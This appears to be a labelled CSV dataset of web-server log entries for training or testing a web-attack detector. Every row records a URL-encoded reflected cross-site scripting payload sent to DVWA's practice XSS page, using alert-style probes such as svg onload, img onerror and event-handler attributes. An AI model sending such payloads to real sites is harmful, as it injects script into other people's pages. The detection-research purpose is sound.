ip,identity,user,timestamp,request,status,size,referer,user_agent,vulnerability,method,url,protocol,request_length,url_parts,user_agent_length,Predicted_Vulnerability
12.12.12.11,-,-,2024-07-01 15:46:16-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%22%20onclick%3dalert(1)%2f%2f%3cbutton%20\xe2\x80\x98%20onclick%3dalert(1)%2f%2f%3e%20%2a%2f%20alert(1)%2f%2f&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1737,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%22%20onclick%3dalert(1)%2f%2f%3cbutton%20\xe2\x80\x98%20onclick%3dalert(1)%2f%2f%3e%20%2a%2f%20alert(1)%2f%2f&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,201,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:16-04:00,"GET /DVWA/vulnerabilities/xss_r/?name='%3balert(String%2efromCharCode(88,83,83))%2f%2f'%3balert(String%2e%20fromCharCode(88,83,83))%2f%2f%22%3balert(String%2efromCharCode%20(88,83,83))%2f%2f%22%3balert(String%2efromCharCode(88,83,83))%2f%2f--%20%3e%3c%2fSCRIPT%3e%22%3e'%3e%3cSCRIPT%3ealert(String%2efromCharCode(88,83,83))%20%3c%2fSCRIPT%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1",200,1770,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,"/DVWA/vulnerabilities/xss_r/?name='%3balert(String%2efromCharCode(88,83,83))%2f%2f'%3balert(String%2e%20fromCharCode(88,83,83))%2f%2f%22%3balert(String%2efromCharCode%20(88,83,83))%2f%2f%22%3balert(String%2efromCharCode(88,83,83))%2f%2f--%20%3e%3c%2fSCRIPT%3e%22%3e'%3e%3cSCRIPT%3ealert(String%2efromCharCode(88,83,83))%20%3c%2fSCRIPT%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5",HTTP/1.1,394,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:17-04:00,GET /DVWA/vulnerabilities/xss_r/?name=javascript%3a%2f%2f'%2f%3c%2ftitle%3e%3c%2fstyle%3e%3c%2ftextarea%3e%3c%2fscript%3e--%3e%3cp%22%20onclick%3dalert()%2f%2f%3e%2a%2falert()%2f%2a&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1747,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=javascript%3a%2f%2f'%2f%3c%2ftitle%3e%3c%2fstyle%3e%3c%2ftextarea%3e%3c%2fscript%3e--%3e%3cp%22%20onclick%3dalert()%2f%2f%3e%2a%2falert()%2f%2a&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,234,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:18-04:00,GET /DVWA/vulnerabilities/xss_r/?name=javascript%3a%2f%2f--%3e%3c%2fscript%3e%3c%2ftitle%3e%3c%2fstyle%3e%22%2f%3c%2ftextarea%3e%2a%2f%3calert()%2f%2a'%20onclick%3dalert()%2f%2f%3ea&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1746,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=javascript%3a%2f%2f--%3e%3c%2fscript%3e%3c%2ftitle%3e%3c%2fstyle%3e%22%2f%3c%2ftextarea%3e%2a%2f%3calert()%2f%2a'%20onclick%3dalert()%2f%2f%3ea&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,234,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:19-04:00,GET /DVWA/vulnerabilities/xss_r/?name=javascript%3a%2f%2f%3c%2ftitle%3e%22%2f%3c%2fscript%3e%3c%2fstyle%3e%3c%2ftextarea%2f--%3e%2a%2f%3calert()%2f%2a'%20onclick%3dalert()%2f%2f%3e%2f&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1744,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=javascript%3a%2f%2f%3c%2ftitle%3e%22%2f%3c%2fscript%3e%3c%2fstyle%3e%3c%2ftextarea%2f--%3e%2a%2f%3calert()%2f%2a'%20onclick%3dalert()%2f%2f%3e%2f&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,236,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:19-04:00,GET /DVWA/vulnerabilities/xss_r/?name=javascript%3a%2f%2f%3c%2ftitle%3e%3c%2fstyle%3e%3c%2ftextarea%3e--%3e%3c%2fscript%3e%3ca%22%2f%2f'%20onclick%3dalert()%2f%2f%3e%2a%2falert()%2f%2a&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1747,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=javascript%3a%2f%2f%3c%2ftitle%3e%3c%2fstyle%3e%3c%2ftextarea%3e--%3e%3c%2fscript%3e%3ca%22%2f%2f'%20onclick%3dalert()%2f%2f%3e%2a%2falert()%2f%2a&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,237,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:20-04:00,GET /DVWA/vulnerabilities/xss_r/?name=javascript%3a%2f%2f'%2f%2f%22%20--%3e%3c%2ftextarea%3e%3c%2fstyle%3e%3c%2fscript%3e%3c%2ftitle%3e%3cb%20onclick%3d%20alert()%2f%2f%3e%2a%2falert()%2f%2a&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1748,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=javascript%3a%2f%2f'%2f%2f%22%20--%3e%3c%2ftextarea%3e%3c%2fstyle%3e%3c%2fscript%3e%3c%2ftitle%3e%3cb%20onclick%3d%20alert()%2f%2f%3e%2a%2falert()%2f%2a&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,243,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:21-04:00,"GET /DVWA/vulnerabilities/xss_r/?name=javascript%3a%2f%2f%3c%2ftitle%3e%3c%2ftextarea%3e%3c%2fstyle%3e%3c%2fscript%20--%3e%3cli%20'%2f%2f%22%20'%2a%2falert()%2f%2a',%20onclick%3dalert()%2f%2f&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1",200,1749,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,"/DVWA/vulnerabilities/xss_r/?name=javascript%3a%2f%2f%3c%2ftitle%3e%3c%2ftextarea%3e%3c%2fstyle%3e%3c%2fscript%20--%3e%3cli%20'%2f%2f%22%20'%2a%2falert()%2f%2a',%20onclick%3dalert()%2f%2f&user_token=9f6911951c8b8d903fd5b7a9834a6ae5",HTTP/1.1,244,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:22-04:00,GET /DVWA/vulnerabilities/xss_r/?name=javascript%3aalert()%2f%2f--%3e%3c%2fscript%3e%3c%2ftextarea%3e%3c%2fstyle%3e%3c%2ftitle%3e%3ca%22%2f%2f'%20onclick%3dalert()%2f%2f%3e%2a%2falert()%2f%2a&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1747,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=javascript%3aalert()%2f%2f--%3e%3c%2fscript%3e%3c%2ftextarea%3e%3c%2fstyle%3e%3c%2ftitle%3e%3ca%22%2f%2f'%20onclick%3dalert()%2f%2f%3e%2a%2falert()%2f%2a&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,244,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:23-04:00,GET /DVWA/vulnerabilities/xss_r/?name=--%3e%3c%2fscript%3e%3c%2ftitle%3e%3c%2fstyle%3e%22%2f%3c%2ftextarea%3e%3ca'%20onclick%3dalert()%2f%2f%3e%2a%2falert()%2f%2a&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1741,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=--%3e%3c%2fscript%3e%3c%2ftitle%3e%3c%2fstyle%3e%22%2f%3c%2ftextarea%3e%3ca'%20onclick%3dalert()%2f%2f%3e%2a%2falert()%2f%2a&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,215,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:23-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%2f%3c%2ftitle%2f'%2f%3c%2fstyle%2f%3c%2fscript%2f%3c%2ftextarea%2f--%3e%3cp%22%20onclick%3dalert()%2f%2f%3e%2a%2falert()%2f%2a&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1743,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%2f%3c%2ftitle%2f'%2f%3c%2fstyle%2f%3c%2fscript%2f%3c%2ftextarea%2f--%3e%3cp%22%20onclick%3dalert()%2f%2f%3e%2a%2falert()%2f%2a&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,218,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:24-04:00,GET /DVWA/vulnerabilities/xss_r/?name=javascript%3a%2f%2f--%3e%3c%2ftitle%3e%3c%2fstyle%3e%3c%2ftextarea%3e%3c%2fscript%3e%3csvg%20%22%2f%2f'%20onclick%3dalert()%2f%2f&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1743,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=javascript%3a%2f%2f--%3e%3c%2ftitle%3e%3c%2fstyle%3e%3c%2ftextarea%3e%3c%2fscript%3e%3csvg%20%22%2f%2f'%20onclick%3dalert()%2f%2f&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,220,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:25-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%2f%3c%2ftitle%2f'%2f%3c%2fstyle%2f%3c%2fscript%2f--%3e%3cp%22%20onclick%3dalert()%2f%2f%3e%2a%2falert()%2f%2a&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1738,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%2f%3c%2ftitle%2f'%2f%3c%2fstyle%2f%3c%2fscript%2f--%3e%3cp%22%20onclick%3dalert()%2f%2f%3e%2a%2falert()%2f%2a&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,201,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:26-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cobject%20onafterscriptexecute%3dconfirm(0)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1728,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cobject%20onafterscriptexecute%3dconfirm(0)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,139,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:27-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cobject%20onbeforescriptexecute%3dconfirm(0)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1729,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cobject%20onbeforescriptexecute%3dconfirm(0)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,140,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:28-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%3ewindow['alert'](document['domain'])%3cscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1733,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%3ewindow['alert'](document['domain'])%3cscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,150,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:29-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cimg%20src%3d'1'%20onerror%2f%3dalert(0)%20%2f%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1721,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cimg%20src%3d'1'%20onerror%2f%3dalert(0)%20%2f%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,142,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:30-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%3ewindow['alert'](0)%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1724,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%3ewindow['alert'](0)%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,136,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:31-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%3eparent['alert'](1)%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1722,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%3eparent['alert'](1)%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,136,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:32-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%3eself['alert'](2)%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1722,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%3eself['alert'](2)%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,134,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:33-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%3etop['alert'](3)%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1721,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%3etop['alert'](3)%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,133,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:34-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%22%3e%3csvg%20onload%3dalert(1)%2f%2f&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1718,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%22%3e%3csvg%20onload%3dalert(1)%2f%2f&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,129,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:35-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%22onmouseover%3dalert(1)%2f%2f&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1717,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%22onmouseover%3dalert(1)%2f%2f&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,122,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:36-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%22autofocus%2fonfocus%3dalert(1)%2f%2f&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1720,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%22autofocus%2fonfocus%3dalert(1)%2f%2f&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,130,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:37-04:00,GET /DVWA/vulnerabilities/xss_r/?name='-alert(1)-'&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1711,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name='-alert(1)-'&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,103,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:38-04:00,GET /DVWA/vulnerabilities/xss_r/?name='-alert(1)%2f%2f&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1711,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name='-alert(1)%2f%2f&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,107,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:39-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%5c'-alert(1)%2f%2f&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1712,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%5c'-alert(1)%2f%2f&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,110,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:40-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3c%2fscript%3e%3csvg%20onload%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1718,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3c%2fscript%3e%3csvg%20onload%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,135,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:42-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20contenteditable%20onblur%3dalert(1)%3elose%20focus!&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1731,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20contenteditable%20onblur%3dalert(1)%3elose%20focus!&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,149,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:43-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20onclick%3dalert(1)%3eclick%20this!&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1723,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20onclick%3dalert(1)%3eclick%20this!&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,132,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:44-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20oncopy%3dalert(1)%3ecopy%20this!&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1722,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20oncopy%3dalert(1)%3ecopy%20this!&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,130,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:45-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20oncontextmenu%3dalert(1)%3eright%20click%20this!&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1732,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20oncontextmenu%3dalert(1)%3eright%20click%20this!&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,146,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:46-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20oncut%3dalert(1)%3ecut%20this!&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1721,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20oncut%3dalert(1)%3ecut%20this!&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,128,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:48-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20ondblclick%3dalert(1)%3edouble%20click%20this!&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1730,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20ondblclick%3dalert(1)%3edouble%20click%20this!&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,144,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:49-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20ondrag%3dalert(1)%3edrag%20this!&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1722,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20ondrag%3dalert(1)%3edrag%20this!&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,130,5,116,XSS
